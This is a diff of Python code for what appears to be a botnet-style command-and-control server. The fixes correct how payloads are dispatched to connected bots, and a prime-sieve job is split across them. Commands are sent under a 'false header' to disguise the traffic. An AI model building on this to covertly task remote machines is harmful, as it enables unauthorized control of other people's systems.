@@ -29,11 +29,12 @@ class Bot:
 
 #unfortunately manager.list does not handle custom classes very well so we manually convert targets and results to strings
 class Payload:
-    ID = ''
-    command = ''
-    name = ''
-    targets = "" #list of bots
-    results = "" #list of botId and results
+    def __init__(self):
+        self.ID = ''
+        self.command = ''
+        self.name = ''
+        self.targets = "" #list of bots
+        self.results = "" #list of botId and results
     def addTarget(self, botId):
         temp = []
         if(self.targets == ""):
@@ -169,7 +170,7 @@ def communicate(conn, address, payloadProxy, BOTS, finished):
                                 if len(p.getTargets()) == len(p.getResults()):
                                     finished.append(p)
                                     with open(p.ID+".res", 'w') as f:
-                                        f.write(p.getResults)
+                                        f.write(str(p.getResults()))
                                     try:
                                         payloads.remove(p)
                                     except Exception, e:
@@ -190,33 +191,40 @@ def communicate(conn, address, payloadProxy, BOTS, finished):
                         response = ""
                         
                         if "XYZ12" in p.command:#this is sieve payload
-   							botlist = p.getTargets()
-							tempcommand = p.command
-							for bot, botindex in enumerate(botlist):
-								p.command = tempcommand
-								for line in p.command.split('\n'):
-									#grab lines
-									#look for n = int
-									#then index into it by BOTID
-									#then put proper values for top/bottom of the partition
-									if "n = " not in line:
-										continue
-									topofsieve = line.split(' ')[2]
-									
-									partitionint = int(n/botlist.length())
-									
-									p.command.append("\ntlow = {}\nthigh = {}\n".format(partitionint*botindex, (botindex+1)*partitionint-1))
-									
-									full_command = genCommandFromPayload(p)
-									response = createFalseHeader(len(full_command), full_command)
-									logging.debug("Sending Response: " + response)
-									conn.send(response)
+                            botlist = p.getTargets()
+                            tempcommand = p.command
+                            logging.debug("tempcommand = " + str(botlist))
+                            for botindex, bot in enumerate(botlist):
+                                p.command = tempcommand
+                                for line in tempcommand.split('\n'):
+                                    #grab lines
+                                    #look for n = int
+                                    #then index into it by BOTID
+                                    #then put proper values for top/bottom of the partition
+                                    if "n = " not in line:
+                                        continue
+                                    topofsieve = line.split(' ')[2]
+                                
+                                partitionint = int(int(topofsieve)/len(botlist))
+
+                                logging.debug("botindex1 " + str(partitionint*botindex))
+                                t = ""
+                                t = "\ntlow = {}\nthigh = {}\n".format(str(partitionint*botindex), str((botindex+1)*partitionint-1))
+                                logging.debug("pitttt = " + t)
+                                logging.debug("command1 = " + p.command)
+                                p.command = tempcommand + t
+                                logging.debug("command2 = " + p.command)
+                                full_command = genCommandFromPayload(p)
+                                response = createFalseHeader(len(full_command), full_command)
+                                logging.debug("Sending Response: " + response)
+                                conn.send(response)
+                                
 
                         else:
-							full_command = genCommandFromPayload(p)
-							response = createFalseHeader(len(full_command), full_command)
-							logging.debug("Sending Response: " + response)
-							conn.send(response)
+                            full_command = genCommandFromPayload(p)
+                            response = createFalseHeader(len(full_command), full_command)
+                            logging.debug("Sending Response: " + response)
+                            conn.send(response)
                     else:
                         full_command = 'Nada'
                         response = createFalseHeader(len(full_command), full_command)
